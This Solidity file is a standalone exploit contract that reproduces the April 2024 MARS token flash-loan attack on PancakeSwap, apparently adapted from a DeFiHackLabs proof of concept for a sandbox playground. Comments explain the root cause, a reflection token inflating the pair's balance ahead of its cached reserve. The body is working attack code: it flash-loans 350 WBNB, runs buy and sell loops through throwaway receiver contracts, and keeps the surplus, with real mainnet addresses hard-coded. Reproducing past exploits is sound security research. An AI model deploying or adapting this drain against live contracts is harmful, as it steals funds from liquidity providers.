// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2024-04-MARS).
// The DeFiHackLabs PoC runs the whole attack INLINE on the Foundry test
// contract itself (MARS_EXP is Test) via a PancakeV3 flash-loan callback
// (pancakeV3FlashCallback) — there is no separate exploit contract to deploy.
// This is a faithful, self-contained copy of that inline attack (testExploit_MARS
// -> run, flash callback unchanged) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/MARS_exp.sol.
//
// Root cause: MARS is a fee-on-transfer / reflection token. Every transfer
// skims a tax and re-credits it as raw balance to existing holders, INCLUDING
// the MARS/WBNB PancakeSwap V2 pair, without ever calling sync() on the pair.
// The pair's swap() prices trades from its cached `reserve`, which only
// refreshes on mint/burn/swap/sync — so the pair's real MARS balance silently
// grows ahead of its stale reserve. Repeatedly buying (which pushes MARS into
// the pair, inflating its real balance via reflection while the reserve lags)
// and then selling (which is priced against the now-stale-low reserve) lets
// the attacker extract WBNB the pool cannot mathematically defend, funded by
// a zero-capital PancakeV3 flash loan.

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

IPancakeV3Pool constant v3pair = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
IERC20 constant bnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IPancakeRouter constant router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);

contract MARSDrain {
    uint256 lending_amount = 350 ether;

    // Faithful copy of testExploit_MARS(): flash-loan 350 WBNB from the
    // PancakeV3 pool; the buy/sell loop runs in the flash callback below.
    function run() external {
        v3pair.flash(address(this), 0, lending_amount, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        bnb.approve(address(router), 2 ** 256 - 1);
        MARS.approve(address(router), 2 ** 256 - 1);

        address[] memory path = new address[](2);
        path[0] = address(bnb);
        path[1] = address(MARS);

        // Buy loop: repeatedly buy ~1000 MARS at a time, each routed to a
        // fresh TokenReceiver (bypasses any per-holder cooldown/blacklist and
        // resets holder-specific reflection accounting), then pull it back.
        for (uint256 i = 0; ; ) {
            if (bnb.balanceOf(address(this)) == 0) {
                break;
            }
            uint256 tobuy = router.getAmountsIn(1000 ether, path)[0];
            TokenReceiver receiver = new TokenReceiver();
            if (bnb.balanceOf(address(this)) > tobuy) {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    tobuy, 0, path, address(receiver), block.timestamp + 1
                );
                MARS.transferFrom(address(receiver), address(this), MARS.balanceOf(address(receiver)));
            } else {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    bnb.balanceOf(address(this)), 0, path, address(receiver), block.timestamp + 1
                );
                MARS.transferFrom(address(receiver), address(this), MARS.balanceOf(address(receiver)));
                break;
            }
        }

        path[0] = address(MARS);
        path[1] = address(bnb);

        // Sell loop: sell the accumulated MARS back in 1000-MARS chunks. The
        // pair's real MARS balance (inflated by accrued reflections) is now
        // well above its stale reserve, so each sell extracts WBNB at a
        // MARS-underpriced rate.
        for (uint256 i = 0; ; ) {
            if (MARS.balanceOf(address(this)) == 0) {
                break;
            }
            if (MARS.balanceOf(address(this)) > 1000 ether) {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    1000 ether, 0, path, address(this), block.timestamp + 1
                );
            } else {
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    MARS.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1
                );
                break;
            }
        }

        // Repay flash-loan principal + V3 premium; keep the surplus.
        bnb.transfer(msg.sender, lending_amount + fee1);
    }
}

contract TokenReceiver {
    constructor() {
        MARS.approve(msg.sender, 2 ** 256 - 1);
    }
}
